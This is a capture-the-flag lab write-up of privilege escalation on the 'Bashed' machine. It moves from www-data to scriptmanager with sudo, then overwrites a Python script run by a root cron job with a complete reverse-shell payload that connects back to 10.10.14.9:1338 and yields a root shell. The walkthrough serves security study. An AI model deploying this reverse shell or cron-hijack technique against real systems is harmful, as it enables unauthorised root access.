Since `www-data` can run sudo commands as `scriptmanager`, the attacker can become the `scriptmanager` user.

Connected to the reverse shell. See [03 - Website](Bashed/03%20-%20Website.md)
```
www-data@bashed:/$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/$ 
```

```
scriptmanager@bashed:/scripts$ ls -l
total 16
-rw-r--r-- 1 scriptmanager scriptmanager 175 Sep 15 07:21 exploit.py
-rw-r--r-- 1 scriptmanager scriptmanager  58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root           12 Sep 15 10:46 test.txt
-rw-r--r-- 1 scriptmanager scriptmanager 184 Sep 15 07:18 testtest.py
```

The test.txt file updates every minute.
There is likely a root cron job running every minute, executing test.py.
Overwriting it may grant a shell.

## Creating a malicious test.py
```
scriptmanager@bashed:/scripts$ cat test.py 
import socket
import subprocess
import os

# Set the IP address and port of the attacker's machine
SERVER_IP = '10.10.14.9'
SERVER_PORT = 1338

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's machine
s.connect((SERVER_IP, SERVER_PORT))

# Redirect standard input/output/error to the socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Start a shell
p = subprocess.call(['/bin/sh', '-i'])

```

Listening on the attacking system... got a shell!
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.68] 50570
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```